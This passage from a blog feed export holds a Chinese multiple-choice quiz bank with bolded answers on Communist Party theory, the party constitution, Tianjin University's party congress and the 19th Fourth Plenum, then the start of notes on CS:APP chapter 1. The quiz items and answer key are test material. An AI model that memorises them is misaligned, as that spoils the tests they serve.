<p>围绕贯彻落实习近平新时代中国特色社会主义思想，报告提出了新时代中国特色社会主义基本方略，并概括为“（）个坚持”。<br>十二<br>十三<br><strong>十四</strong><br>十五</p>
<p>坚持和发展中国特色社会主义，是改革开放以来我们党全部理论和实践的鲜明主题，也是习近平新时代中国特色社会主义思想的（）。<br><strong>核心要义</strong><br>基本路线<br>重要内容<br>根本原则</p>
<p>（）是习近平新时代中国特色社会主义思想的形成来源。<br><strong>独特的个人经历的影响</strong><br><strong>改革开放的丰富实践探索</strong><br><strong>中国传统文化的浸润与积淀</strong><br><strong>马克思主义理论的继承与发展</strong></p>
<p>党的十八大以来，国内外形势深刻变化和我国各项事业快速发展催生了习近平新时代中国特色社会主义思想，这一思想回答了实践和时代提出的新课题。实践和理论的逻辑就是（）。<br>新时代开启新征程，新征程催生新理论，新理论引领新实践<br>新时代开启新征程，新征程催生新思想，新思想引领新实践<br><strong>新时代提出新课题，新课题催生新理论，新理论引领新实践</strong><br>新时代提出新课题，新课题催生新思想，新思想引领新实践</p>
<p>从党的（）到（），是“两个一百年”奋斗目标的历史交汇期。<br>十八大、二十大<br>十九大、二十一大<br>十八大、十九大<br><strong>十九大、二十大</strong></p>
<h1 id="十七-中国共产党章程、中国共产党发展党员工作细则"><a href="#十七-中国共产党章程、中国共产党发展党员工作细则" class="headerlink" title="十七  中国共产党章程、中国共产党发展党员工作细则"></a>十七  中国共产党章程、中国共产党发展党员工作细则</h1><p>党章规定，党的最高领导机关是（）。<br>全国人民代表大会<br><strong>党的全国代表大会和它所产生的中央委员会</strong><br>中央政治局<br>中央书记处</p>
<p>发展社会主义民主政治，建设社会主义政治文明，是全面建设小康社会的重要目标。发展社会主义民主政治，最根本的是要坚持（）的有机统一，走中国特色社会主义政治发展道路。<br><strong>人民当家作主</strong><br>科学发展<br><strong>党的领导</strong><br><strong>依法治国</strong></p>
<p>企业、农村、机关、学校、科研院所、街道社区、社会团体、社会中介组织、人民解放军连队和其他基层单位，凡是有（）以上的，都应当成立党的基层组织。<br>正式党员五人<br>预备党员三人<br><strong>正式党员三人</strong><br>预备党员五人</p>
<p>加快推进反腐败国家立法，完善惩治和预防腐败体系，形成（）的有效机制，坚决遏制和预防腐败现象。<br><strong>不敢腐</strong><br><strong>不能腐</strong><br><strong>不想腐</strong><br>不易腐</p>
<p>马克思列宁主义揭示了（）的规律，它的基本原理是正确的，具有强大的生命力。<br><strong>人类社会历史发展</strong><br>辩证唯物主义<br>资本主义发展及其内在矛盾<br>共产主义</p>
<p>中国共产党领导人民发展社会主义市场经济（）。<br><strong>统筹城乡发展、区域发展、经济社会发展、人与自然和谐发展、国内发展和对外开放，调整经济结构，转变经济发展方式</strong><br><strong>发挥市场在资源配置中的基础性作用，建立完善的宏观调控体系</strong><br><strong>毫不动摇地鼓励、支持、引导非公有制经济发展</strong><br><strong>毫不动摇地巩固和发展公有制经济</strong></p>
<p>《中国共产党发展党员工作细则》规定：预备党员预备期满后，（）应按时讨论其能否转为正式党员。<br>党委<br>党组织<br><strong>党支部</strong><br>入党申请人学习小组</p>
<p>《中国共产党发展党员工作细则》规定：党在任何时候都坚持（），不允许任何党员脱离群众，凌驾于群众之上。<br><strong>情为民所系</strong><br>绩为民所创<br><strong>权为民所用</strong><br><strong>利为民所谋</strong></p>
<p>党员如果没有正当理由，连续（）不参加党的组织生活，或不交纳党费，或不做党所分配的工作，就被认为是自行脱党。<br>九个月<br>三个月<br>一年<br><strong>六个月</strong></p>
<p>《中国共产党发展党员工作细则》规定：按期转正，延长预备期，取消预备党员资格，都必须经（）讨论通过并报上级党委批准。<br><strong>支部大会</strong><br>入党申请人学习小组<br>民主生活会<br>正式党员</p>
<p>预备党员的权利，除了没有（）以外，也同正式党员一样。<br>表决权、选举权<br>表决权、被选举权<br>选举权、被选举权<br><strong>表决权、选举权和被选举权</strong></p>
<p>党员的党龄，从（）之日算起。<br>预备期满<br><strong>预备期满转为正式党员</strong><br>支部大会通过<br>党委审批通过</p>
<p>《中国共产党发展党员工作细则》规定： 发展党员工作应当贯彻党的基本理论、基本路线、基本纲领、基本经验、基本要求，按照控制总量、优化结构、提高质量、发挥作用的总要求，坚持党章规定的党员标准，始终把政治标准放在首位；坚持慎重发展、均衡发展，有领导、有计划地进行；坚持入党自愿的原则和（）的原则，成熟一个，发展一个。禁止突击发展，反对“关门主义”。<br><strong>个别吸收</strong><br>广泛发展<br>多级发展<br>稳步发展</p>
<p>党的纪律处分有（）。<br>警告、撤销党内外职务；留党察看、取消党籍、开除党籍<br><strong>警告、严重警告、撤销党内职务、留党察看、开除党籍</strong><br>警告、严重警告、记过、留党察看、开除党籍<br>警告、严重警告、撤职查办、留党察看、开除党籍</p>
<p>坚持改革开放，是我们的强国之路，应当（）。<br><strong>进行政治体制改革和其他领域的改革</strong><br><strong>从根本上改革束缚生产力发展的经济体制，坚持和完善社会主义市场经济体制</strong><br><strong>要坚持对外开放的基本国策，吸收和借鉴人类社会创造的一切文明成果</strong><br><strong>大胆探索，勇于开拓，提高改革决策的科学性，更加注重改革的系统性、整体性、协同性，在实践中开创新路</strong></p>
<p>《中国共产党发展党员工作细则》规定：发展对象应当有（ ）作入党介绍人。入党介绍人一般由培养联系人担任，也可由党组织指定。<br>两名预备党员<br><strong>两名正式党员</strong><br>一名正式党员<br>一名正式党员或两名预备党员</p>
<p>《中国共产党发展党员工作细则》规定：预备党员预备期满，党支部应当及时讨论其能否转为正式党员。认真履行党员义务、具备党员条件的，应当按期转为正式党员；需要继续考察和教育的，可以延长一次预备期，延长时间最长不超过（）；不履行党员义务、不具备党员条件的，应当取消其预备党员资格。<br><strong>一年</strong><br>九个月<br>三个月<br>六个月</p>
<p>中国共产党的最大政治优势是（）。<br><strong>密切联系群众</strong><br>批评与自我批评<br>理论联系实际<br>全心全意为人民服务</p>
<p>《中国共产党发展党员工作细则》规定：党支部每（）要对要求人党的积极分子进行一次考察。<br>两个月<br>四个月<br><strong>半年</strong><br>三个月</p>
<p>党必须适应形势的发展和情况的变化，完善领导机制，改进领导方式，增强（）。<br>协调能力<br>组织能力<br><strong>执政能力</strong><br>领导能力</p>
<h1 id="十八-中共天津大学第十次党员代表大会"><a href="#十八-中共天津大学第十次党员代表大会" class="headerlink" title="十八  中共天津大学第十次党员代表大会"></a>十八  中共天津大学第十次党员代表大会</h1><p>中共天津大学第十次党员代表大会的主题是：深入学习贯彻党的十九大精神，以习近平新时代中国特色社会主义思想为指导，落实立德树人根本任务，坚持（），深化（），建设（），凝心聚力，改革创新，开启全面建设中国特色、世界一流、天大品格社会主义大学的新征程，为实现中华民族伟大复兴的中国梦作出天大贡献。<br>“五个始终”、“四项改革”、“五个一流”<br><strong>“五个始终”、“五项改革”、“五个一流”</strong><br>“四个始终”、“四项改革”、“四个一流”<br>“四个始终”、“五项改革”、“四个一流”</p>
<p>高等学校党的委员会要坚持党管干部的原则，对学校党政干部实行统一管理，按照干部队伍（）的方针选拔任用干部。<br>示范化、稳重化、理性化、精简化<br><strong>革命化、年轻化、知识化、专业化</strong><br>示范化、稳重化、知识化、专业化<br>革命化、年轻化、理性化、精简化</p>
<p>五年来，天津大学产出了水利水电工程建设仿真和数字大坝技术、水下滑翔机“___”技术、智能电网技术、脑机交互技术、合成生物技术等一批重大成果，获得国家科学技术奖20项，社科重大项目实现持续立项。<br><strong>海燕</strong><br>水翼<br>水燕<br>海翼</p>
<p>天津大学坚持整体推进、试点先行、突出重点、（）的改革思路，加强改革的顶层设计和总体规划，着力突破制约学校发展的体制机制障碍。<br>稳中求进<br>重心上移<br>重心平移<br><strong>重心下移</strong></p>
<p>高等学校党的委员会要坚持（）的用人标准，深入贯彻“民主、公开、竞争、择优”方针，不断优化干部选拔任用机制。<br>德才兼备 德才并重<br><strong>德才兼备 以德为先</strong><br>明德爱人 以德为先<br>明德爱人 德才并重</p>
<p>在组织工作过程中，凡属重大问题都要按照（）原则，由党的委员会集体讨论，作出决定。<br><strong>民主集中</strong><br><strong>会议决定</strong><br><strong>集体领导</strong><br><strong>个别酝酿</strong></p>
<p>在组织工作过程中，按照（）的方针和有关规定，加强对入党积极分子的教育、培养和考察，加强在优秀青年教师、优秀学生中发展党员工作。<br><strong>坚持标准</strong><br><strong>保证质量</strong><br><strong>慎重发展</strong><br><strong>改善结构</strong></p>
<p>《关于加强和改进新形势下高校思想政治工作的意见》指出，要强化思想理论教育和价值引领，弘扬以（）为核心的民族精神和以（）为核心的时代精神。<br>改革创新 爱国主义<br>创新创业 自强不息<br>自强不息 创新创业<br><strong>爱国主义 改革创新</strong></p>
<p>根据《中国共产党普通高等学校基层组织工作条例》原文，高等学校党组织应通过（）不断提高党员政治和业务素质。<br>对党的优良作风、宗旨意识教育<br><strong>教育党员努力掌握科学文化知识和专业技能</strong><br><strong>对党的基本路线、基本纲领和党的基本知识教育</strong><br><strong>对党员进行马列主义、毛泽东思想教育特别是中国特色社会主义理论体系的教育</strong></p>
<p>高等学校党组织应当构建（）的党员经常性学习教育体系。对党员进行马克思列宁主义、毛泽东思想教育特别是中国特色社会主义理论体系的教育，党的基本路线、基本纲领和党的基本知识教育，并教育党员努力掌握科学文化知识和专业技能，不断提高政治和业务素质。<br>多领域、长效性<br><strong>多层次、多渠道</strong><br>多层次、长效性<br>多领域、多渠道</p>
<p>第九次党代会指出：必须坚持育人为本，全面推进素质教育，构建“全员育人、全方位育人、全过程育人”的整体格局。促进“教”与“学”的互动，在学生全面发展的基础上，充分尊重并积极促进学生的个性发展，启迪、引导和促进学生主动发展,为可持续发展奠定基础。培养具有（）的高素质拔尖创新人才，使之具备卓越的国际竞争力、创造力、实践力和领导力。<br><strong>业务精湛</strong><br><strong>社会责任感</strong><br>全球视野<br><strong>创新精神</strong></p>
<p>天津大学必将建设与世界知名高水平大学相适应的人事管理制度。完善分类评价制度，尊重和支持教师在（）等各领域做出贡献。<br><strong>社会服务</strong><br><strong>科学研究</strong><br><strong>文化建设</strong><br><strong>教育教学</strong></p>
<p>《关于加强和改进新形势下高校思想政治工作的意见》指出，紧密团结在以习近平同志为核心的党中央周围，牢固树立（）、大局意识、核心意识、看齐意识。<br>经济意识<br>文化意识<br>思想意识<br><strong>政治意识</strong></p>
<p>改革开放以来，天津大学首倡（）的办学思路，深化高等工程教育改革，聚焦国家重大战略需求、聚焦世界科技发展前沿，培养了 30万高层次人才，为国家建设发展提供了有力支撑。<br><strong>“综合性、研究型、开放式、国际化”</strong><br>“全面性、科研型、包容式、前沿化”<br>“全面性、研究型、包容式、前沿化”<br>“综合性、科研型、开放式、国际化”</p>
<p>天津大学深化体制机制改革，整体办学实力不断增强，初步形成了“强工、厚理、_____、兴医”的综合性学科布局。<br>崇法<br>崇文<br><strong>振文</strong><br>振法</p>
<p>《关于加强和改进新形势下高校思想政治工作的意见》指出，要发挥哲学社会科学育人功能，强化（）理论学科的引领作用。<br>法学<br>历史学<br>社会学<br><strong>马克思主义</strong></p>
<p>高等学校实行（）领导下的校长负责制。<br>党员代表大会<br>团委<br>党员代表大会常务委员会<br><strong>党委</strong></p>
<p>天津大学“新三步走”战略中第三步是：到2045年（建校150周年），办学主要指标和声誉进入全球前一百，全面建成中国特色、（）、天大品格的社会主义大学。<br>全球一流<br><strong>世界一流</strong><br>世界顶尖<br>全球顶尖</p>
<p>《关于加强和改进新形势下高校思想政治工作的意见》指出，要加强高校基层党建工作，建立健全高校基层党组织，加强教师党支部、学生党支部特别是研究生党支部建设，充分发挥党支部（）作用。<br>模范先锋<br><strong>战斗堡垒</strong><br>带头<br>领导</p>
<p>天津大学第十次党员代表大会的工作报告指出，要扎实做好纪律审查工作，紧紧围绕政治纪律、组织纪律、（）、（）、（）、（）等“六项纪律”，认真检查处理学校党员干部违规违纪问题线索，及时受理控告和申诉，对违反党纪的依纪依规作出纪律处分，维护党章和党内法规。<br><strong>廉洁纪律、群众纪律、工作纪律、生活纪律</strong><br>生活纪律、文化纪律、群众纪律、道德纪律<br>工作纪律、廉洁纪律、思想纪律、生活纪律<br>生活纪律、廉洁纪律、文化纪律、思想纪律</p>
<h1 id="十九-十九届四中全会"><a href="#十九-十九届四中全会" class="headerlink" title="十九  十九届四中全会"></a>十九  十九届四中全会</h1><p>党的十九届四中全会要求，弘扬（）和（），加快建设创新型国家，强化国家战略科技力量，健全国家实验室体系，构建社会主义市场经济条件下关键核心技术攻关新型举国体制。<br>钻研精神<br>奋斗精神<br><strong>科学精神</strong><br><strong>工匠精神</strong></p>
<p>党的十九届四中全会指出，中国特色社会主义制度和国家治理体系是以（）为指导、植根中国大地、具有深厚中华文化根基、深得人民拥护的制度和治理体系。<br><strong>马克思主义</strong><br>习近平新时代中国特色社会主义思想<br>毛泽东思想<br>中国特色社会主义理论体系</p>
<p>党的十九届四中全会强调，把提高（）作为新时代干部队伍建设的重大任务。<br>执政水平<br>治理水平<br>执政能力<br><strong>治理能力</strong></p>
<p>党的十九届四中全会强调，实行最严格的生态环境保护制度。坚持人与自然和谐共生，坚守尊重自然、顺应自然、保护自然，健全（）的生态环境保护体系。<br><strong>源头预防</strong><br><strong>过程控制</strong><br><strong>责任追究</strong><br><strong>损害赔偿</strong></p>
<p>党的十九届四中全会指出，坚持和完善中国特色社会主义制度、推进国家治理体系和治理能力现代化，是全党的一项重大（）。<br>战略路线<br>战略方向<br><strong>战略任务</strong><br>战略方针</p>
<p>党的十九届四中全会要求，全面贯彻落实习近平新时代中国特色社会主义思想，健全用党的（）武装全党、教育人民工作体系，完善党委（党组）理论学习中心组等各层级学习制度，建设和用好网络学习平台。<br>中国特色社会主义理论<br>关键理论<br>核心理论<br><strong>创新理论</strong></p>
<p>党的十九届四中全会强调，完善和发展我国国家制度和治理体系，必须坚持（）、（），既把握长期形成的历史传承，又把握党和人民在我国国家制度建设和国家治理方面走过的道路、积累的经验、形成的原则，不能照抄照搬他国制度模式，既不走封闭僵化的老路，也不走改旗易帜的邪路，坚定不移走中国特色社会主义道路。<br>实事求是<br>因地制宜<br><strong>从国情出发</strong><br><strong>从实际出发</strong></p>
<p>党的十九届四中全会要求，加快形成完备的法律规范体系、高效的法治实施体系、严密的法治监督体系、有力的法治保障体系，加快形成完善的党内法规体系，全面推进科学立法、严格执法、公正司法、全民守法，推进（）建设。<br>社会主义民主法治国家<br>法治国家<br>社会主义法治<br><strong>法治中国</strong></p>
<p><em>2020.4.29更新：上题答案更改，由第三项改为第四项。</em></p>
<p>党的十九届四中全会要求，创新行政管理和服务方式，加快推进全国一体化政务服务平台建设，健全强有力的行政执行系统，提高政府（）和（）。<br><strong>执行力</strong><br>行政效率<br><strong>公信力</strong><br>管理效率</p>
<p>党的十九届四中全会要求，坚持总体国家安全观，统筹发展和安全，坚持（）有机统一。<br><strong>国家利益至上</strong><br><strong>人民安全</strong><br><strong>政治安全</strong><br>经济安全</p>
<p>党的十九届四中全会要求，构建系统完备、科学规范、运行有效的制度体系，加强系统治理、依法治理、综合治理、源头治理，把我国制度优势更好转化为（），为实现“两个一百年”奋斗目标、实现中华民族伟大复兴的中国梦提供有力保证。<br>国家治理胜势<br>国家治理优势<br><strong>国家治理效能</strong><br>国家治理能力</p>
<p>党的十九届四中全会强调，必须牢固确立（）在国防和军队建设中的指导地位，巩固和拓展深化国防和军队改革成果，构建中国特色社会主义军事政策制度体系。<br><strong>习近平强军思想</strong><br>马克思主义意识形态<br>党的领导<br>习近平新时代中国特色社会主义思想</p>
<p>党的十九届四中全会强调，完善党委领导、政府负责、民主协商、社会协同、公众参与、法治保障、科技支撑的社会治理体系，建设人人有责、人人尽责、人人享有的（）共同体。<br>社会发展<br><strong>社会治理</strong><br>群众协作<br>群众命运</p>
<p>党的十九届四中全会要求，坚持和发展新时代（），畅通和规范群众诉求表达、利益协调、权益保障通道。<br>“飞地经济”<br><strong>“枫桥经验”</strong><br>“群众解决”<br>群众矛盾就地化解</p>
<p>党的十九届四中全会指出，党和国家（）是党在长期执政条件下实现自我净化、自我完善、自我革新、自我提高的重要制度保障。<br>治理体系<br>全面深化改革<br><strong>监督体系</strong><br>全面自我监督</p>
<p>党的十九届四中全会提出，中国特色社会主义制度是党和人民在长期实践探索中形成的（）体系。我国国家治理一切工作和活动都依照中国特色社会主义制度展开，我国国家治理体系和治理能力是中国特色社会主义制度及其执行能力的集中体现。<br><strong>科学制度</strong><br>科学机制<br>规范制度<br>规范机制</p>
<p>党的十九届四中全会要求，把（）作为加强党的建设的永恒课题和全体党员、干部的终身课题，形成长效机制，坚持不懈锤炼党员、干部忠诚干净担当的政治品格。<br>为人民服务<br><strong>不忘初心、牢记使命</strong><br>脚踏实地、砥砺前行<br>终身学习</p>
<p>党的十九届四中全会要求，全面贯彻党的教育方针，坚持教育优先发展，聚焦办好人民满意的教育，完善（）体制机制。<br><strong>立德树人</strong><br>德育为先<br>教育为本<br>人才培养</p>
<p>党的十九届四中全会强调，必须坚持党政军民学、东西南北中，党是领导一切的，坚决维护党中央权威，健全总揽全局、协调各方的（）制度体系，把党的领导落实到国家治理各领域各方面各环节。<br>党的领导团队<br>中央领导<br><strong>党的领导</strong><br>中央领导团队</p>
<p>中国共产党第十九届中央委员会第四次全体会议审议通过了《中共中央关于坚持和完善（）、推进国家治理体系和治理能力现代化若干重大问题的决定》。<br>中国特色社会主义文化<br><strong>中国特色社会主义制度</strong><br>中国特色社会主义理论体系<br>中国特色社会主义道路</p>
<h1 id="二十-“不忘初心-牢记使命”主题教育"><a href="#二十-“不忘初心-牢记使命”主题教育" class="headerlink" title="二十  “不忘初心 牢记使命”主题教育"></a>二十  “不忘初心 牢记使命”主题教育</h1><p>“两个维护”是指坚决维护习近平总书记在党中央和全党的核心地位，坚决维护（）。<br>党中央的权威和领导地位<br>党中央权威和领导<br><strong>党中央权威和集中统一领导</strong><br>党的领导地位不动摇</p>
<p>关系党生死存亡的问题有（）。<br><strong>党同人民群众联系问题</strong><br>党的根本宗旨问题<br><strong>党风问题</strong><br>党性问题</p>
<p>我们要充分认识开展“不忘初心，牢记使命”主题教育的重大意义。开展这次主题教育,其意义在于（）。<br><strong>是保持党同人民群众血肉联系的迫切需要</strong><br><strong>是推进新时代党的建设的迫切需要</strong><br><strong>是用新时代中国特色社会主义思想武装全党的迫切需要</strong><br><strong>是实现党的十九大确定的目标任务的迫切需要</strong></p>
<p>在全党开展的“不忘初心、牢记使命”主题教育，主要是针对（）干部。<br><strong>县处级以上</strong><br>司厅级以上<br>县级以上<br>省部级以上</p>
<p>全党同志必须始终保持崇高的革命理想和旺盛的革命斗志，用好批评和自我批评这个锐利武器，驰而不息抓好正风肃纪反腐，不断增强党（）的能力，坚决同一切可能动摇党的根基、阻碍党的事业的现象作斗争，荡涤一切附着在党肌体上的肮脏东西，把我们党建设得更加坚强有力。<br><strong>自我净化、自我完善、自我革新、自我提高</strong><br>自我净化、自我改善、自我革新、自我提升<br>自我净化、自我改善、自我革新、自我提高<br>自我净化、自我完善、自我革新、自我提升</p>
<p>“不忘初心、牢记使命”主题教育活动不划阶段、不分环节，要把（）、调查研究、检视问题、整改落实贯穿主题教育全过程。<br>政治教育<br>自我批评<br><strong>学习教育</strong><br>批评教育</p>
<p>中国共产党人的初心和使命是（）。<br>全心全意为人民服务，立党为公，执政为民<br>实现社会主义现代化<br><strong>为中国人民谋幸福，为中华民族谋复兴</strong><br>实现中华民族伟大复兴的中国梦</p>
<p>党的初心和使命是党的性质宗旨、（）、奋斗目标的集中体现，激励着我们党永远坚守，砥砺着我们党坚毅前行。<br><strong>理想信念</strong><br>本质特征<br>政治体制<br>根本任务</p>
<p>“两学一做”中，“两学”是指（）、学系列讲话，“一做”是指做合格党员。<br><strong>学党章党规</strong><br>学党章党史<br>学党史党章<br>学党规党章</p>
<p>习近平总书记在主持召开中央全面深化改革委员会第九次会议强调，要紧密结合“不忘初心、牢记使命”主题教育，提高改革的（）、政治自觉、行动自觉。<br><strong>思想自觉</strong><br>社会自觉<br>文化自觉<br>个人自觉</p>
<p>《关于第一批主题教育单位开好“不忘初心、牢记使命”专题民主生活会的通知》指出，要在对照党章党规找差距的基础上，按照照镜子、正衣冠、洗洗澡、治治病的要求，坚持“（）”的方针，拿起批评和自我批评的武器，开展积极健康的思想斗争，打扫思想上和政治上的灰尘，检身改过、日进日新。<br>团结－批评－再批评<br>团结－批评－再团结<br><strong>团结－批评－团结</strong><br>批评－团结－批评</p>
<p>领导班子要在（）基础上讲专题党课。<br>学习实践<br><strong>学习调研</strong><br>实践<br>调查总结</p>
<p>“不忘初心、牢记使命”主题教育的目的是（）。<br><strong>整改落实</strong><br>学习教育<br>调查研究<br>检视问题</p>
<p>“守初心、担使命、（）、抓落实”的总要求，是根据新时代党的建设任务、针对党内存在的突出问题、结合“不忘初心，牢记使命”主题教育的特点提出来的。<br>明公私<br>知敬畏<br>存底线<br><strong>找差距</strong></p>
<p>《关于第一批主题教育单位开好“不忘初心、牢记使命”专题民主生活会的通知》指出，要充分运用主题教育成果，紧扣（）这一主线。<br>学习贯彻习近平新时期中国特色社会主义思想<br>学习贯彻习近平新时期中国特色社会主义理论<br><strong>学习贯彻习近平新时代中国特色社会主义思想</strong><br>学习贯彻习近平新时代中国特色社会主义理论</p>
<p>“不忘初心、牢记使命”主题教育活动要求，党的各级领导干部特别是高级干部要（），不当局外人，不当旁观者。<br>以上带下、作好示范<br>以上率下、作好榜样<br><strong>以上率下、作好示范</strong><br>以下促下、作好榜样</p>
<p>党的十九届四中全会提出建立不忘初心、牢记使命的制度。建章立制，要坚持系统思维、辩证思维、底线思维，体现（）。<br><strong>针对性</strong><br><strong>指导性</strong><br>革命性<br><strong>操作性</strong></p>
<p>不忘初心、牢记使命，必须完善和发展党内制度，形成长效机制。（）优势是一个政党、一个国家的最大优势。<br><strong>制度</strong><br>政治<br>法律<br>体制</p>
<p>“不忘初心、牢记使命”主题教育的具体目标是理论学习有收获、思想政治受洗礼、干事创业敢担当、（）、清正廉洁作表率。这一目标任务，体现了党对新时代党员干部思想、政治、作风、能力、廉政方面的基本要求。<br>为民分忧解难题<br>为民分忧尽心力<br><strong>为民服务解难题</strong><br>为民服务尽心力</p>
<p>要将力戒（），作为“不忘初心、牢记使命”主题教育的重要内容。<br><strong>形式主义</strong><br><strong>官僚主义</strong><br>奢靡之风<br>享乐主义</p>
]]></content>
      <tags>
        <tag>Others</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解《深入理解计算机系统》</title>
    <url>/CS-APP-Notes/</url>
    <content><![CDATA[<p>对于《深入理解计算机系统（第三版）》一书的一些摘要与想法。Computer Systems: A Programmer’s Perspective_Notes</p>
<p><em>持续更新…</em></p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>本书从程序员的角度，讲述程序员如何能够利用系统知识来编写出更好的程序。</p>
<ul>
<li>你将会学习一些实践技巧，比如如何避免由计算机表示数字的方式引起的奇怪的数字错误。</li>
<li>你将学会怎样通过一些小窍门来优化自己的 C 代码，以充分利用现代处理器和存储器系统的设计。</li>
<li>你将了解编译器是如何实现过程调用的，以及如何利用这些知识来避免缓冲区溢出错误带来的安全漏洞，这些弱点给网络和因特网软件带来了巨大的麻烦。</li>
<li>你将学会如何识别和避免链接时那些令人讨厌的错误，它们困扰着普通的程序员。</li>
<li>你将学会如何编写自己的 Unix shell、自己的动态存储分配包，甚至于自己的 Web 服务器。</li>
<li>你会认识并发带来的希望和陷阱，这个主题随着单个芯片上集成了多个处理器核变得越来越重要。</li>
</ul>
</blockquote>
<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a><em>Background</em></h1><ol>
<li>本书的重点是执行<code>x86-64</code>机器代码的系统。<code>x86-64</code>是英特尔及其竞争对手自1978年起，以<code>8086</code>微处理器为代表，不断进化的最新成果。这类微处理器俗称为“<code>x86</code>”。</li>
<li>处理器的计算能力和内存容量随着半导体技术的演进有了很大的增长，从处理16位字，发展到引入<code>IA32</code>处理器处理32位字，再到最近的<code>x86-64</code>处理64位字。</li>
<li>本书考虑的是这些机器如何在Linux操作系统上运行C语言程序。</li>
<li>本书的前几章揭示了C语言程序和它们相对应的机器语言程序之间的交互作用（即互相转化）。机器语言示例都是用运行在<code>x86-64</code>处理器上的GNU GCC编译器生成的。</li>
<li>学习系统的唯一方法就是**做(do)**系统，即在真正的系统上解决具体的问题，或是编写和运行程序。</li>
</ol>
<h1 id="Chapter-1-A-Tour-of-ComPuter-Systems"><a href="#Chapter-1-A-Tour-of-ComPuter-Systems" class="headerlink" title="Chapter 1: A Tour of ComPuter Systems"></a>Chapter 1: A Tour of ComPuter Systems</h1><blockquote>
<p>第1章：计算机系统漫游。这一章通过研究“<code>hello, world</code>”这个简单程序的生命周期，介绍计算机系统的主要概念和主题。</p>
</blockquote>
<p>所有计算机系统都有相似的硬件和软件组件，它们又执行着相似的功能。本书的目的就是深入了解这些组件是如何工作的以及这些组件是如何影响程序的正确性和性能的，以此来提高程序员自身的技能。</p>
<p>我们是从<code>hello</code>程序来认识C语言的。尽管<code>hello</code>程序非常简单，但是为了让它实现运行，系统的每个主要组成部分都需要协调工作。从某种意义上来说，本书的目的就是要帮助你了解当你在系统上执行<code>hello</code>程序时，系统发生了什么以及为什么会这样。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们通过跟踪<code>hello</code>程序的生命周期来开始对系统的学习——从它被程序员创建开始，到在系统上运行，输出简单的消息，然后终止。</p>
<p>我们将沿着这个程序的生命周期，简要地介绍一些逐步出现的关键概念、专业术语和组成部分。后面的章节将围绕这些内容展开。</p>
<h2 id="1-1-Information-Is-Bits-Context"><a href="#1-1-Information-Is-Bits-Context" class="headerlink" title="1.1 Information Is Bits + Context"></a>1.1 Information Is Bits + Context</h2><ol>
<li>信息就是位+上下文。</li>
<li><code>hello</code>程序的生命周期从源程序的创建开始。</li>
<li>源程序实际就是一个由值<code>0</code>和<code>1</code>组成的<strong>位（bit，比特）</strong>序列，8个位被组织成一组，称为<strong>字节</strong>。</li>
<li>源程序就是以字节序列的方式存储在文件中的，每个字节都有一个整数值，对应于某些字符。对应的标准便是<strong>ASCII标准</strong>——用一个唯一的单字节大小的整数值来表示每个字符。</li>
<li>像源程序这样只由ASCII字符构成的文件称为<strong>文本文件</strong>，所有其他文件都称为<strong>二进制文件</strong>。</li>
<li>源程序的表示方法说明了一个基本思想：系统中所有的信息——包括磁盘文件、内存中的程序、内存中存放的用户数据以及网络上传送的数据，<strong>都是由一串比特表示的</strong>。区分不同数据对象的唯一方法是我们读到这些数据对象时的<strong>上下文</strong>。比如，在不同的上下文中，一个同样的字节序列可能表示一个整数、浮点数、字符串或者机器指令。</li>
<li>从这个基本思想可以看出，数字的机器表示方式与实际的整数和实数是不同的。数字的机器表示值是对真值的有限近似值，有时会有意想不到的行为表现。</li>
<li>C语言与Unix操作系统关系密切。C从一开始就是作为一种用于Unix系统的程序语言开发出来的，大部分Unix内核以及所有支撑工具和函数库都是用C语言编写的。</li>
</ol>
<h2 id="1-2-Programs-Are-Translated-by-Other-Programs-into-Different-Forms"><a href="#1-2-Programs-Are-Translated-by-Other-Programs-into-Different-Forms" class="headerlink" title="1.2 Programs Are Translated by Other Programs into Different Forms"></a>1.2 Programs Are Translated by Other Programs into Different Forms</h2><ol>
<li><p>程序被其他程序翻译成不同的格式。</p>
</li>
<li><p>为了在系统上运行程序，每条C语句都必须被其他程序转化为一系列的低级<strong>机器语言</strong>指令。然后这些指令按照一种称为<strong>可执行目标程序</strong>的格式打好包，并以二进制磁盘文件的形式存放起来。目标程序也称为<strong>可执行目标文件</strong>。</p>
</li>
<li><p>在Unix系统上，从源文件到目标文件的转化是由<strong>编译器驱动程序</strong>完成的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> gcc -o hello hello.c</span></span><br></pre></td></tr></table></figure></li>
<li><p>此时，GCC编译器驱动程序读取源程序文件<code>hello.c</code>，并把它翻译成一个可执行目标文件<code>hello</code>。这个翻译过程可分为四个阶段完成，如图所示。执行这四个阶段的程序（<strong>预处理器</strong>、<strong>编译器</strong>、<strong>汇编器</strong>和<strong>链接器</strong>）一起构成了<span id = "CompilationSystem"><strong>编译系统（compilation system）</strong></span>。<em>（Markdown锚点标签不可有空格）</em></p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E7%BC%96%E8%AF%91%E7%B3%BB%E7%BB%9F.png" alt="编译系统"></p>
<ul>
<li><strong>预处理阶段</strong>。预处理器（cpp）将以<code>#</code>开头的命令的内容直接插入程序文本中，得到以<code>.i</code>作为文件扩展名的另一个C程序。</li>
<li><strong>编译阶段</strong>。编译器（ccl）将<code>.i</code>文本文件翻译成<strong>汇编语言程序</strong>的<code>.s</code>文本文件。汇编语言为不同高级语言的不同编译器提供了通用的输出语言。</li>
<li><strong>汇编阶段</strong>。汇编器（as）将<code>.s</code>文件翻译成机器语言指令，把这些指令打包成<strong>可重定位目标程序（relocatable object program）</strong>的格式，保存在<code>.o</code>二进制文件中。</li>
</ul>
</li>
</ol>
<ul>
<li><ul>
